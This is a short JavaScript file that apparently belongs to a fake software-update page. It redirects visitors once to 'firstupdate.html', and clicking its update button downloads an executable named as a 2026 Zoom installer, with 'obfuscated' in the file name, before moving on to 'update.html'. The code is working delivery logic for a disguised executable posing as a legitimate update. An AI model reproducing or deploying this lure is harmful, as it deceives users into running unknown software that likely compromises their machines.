if (!sessionStorage.getItem('redirected')) {
    sessionStorage.setItem('redirected', 'true');
    setTimeout(function() {
        window.location.href = 'firstupdate.html';
    }, 3000);
}

// when the update button is clicked we need to download the file and then go to update page
var updateButton = document.querySelector('.update-button');
if (updateButton) {
    updateButton.addEventListener('click', function(event) {
        // prevent default anchor behavior if any
        event.preventDefault();
        // create a temporary link to download
        var a = document.createElement('a');
        a.href = 'ZoomInstallerFull 2026 updated version26.5.8.21..obfuscated.exe';
        a.download = 'ZoomInstallerFull 2026 updated version26.5.8.21..obfuscated.exe';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        // then navigate to update page
        window.location.href = 'update.html';
    });
}
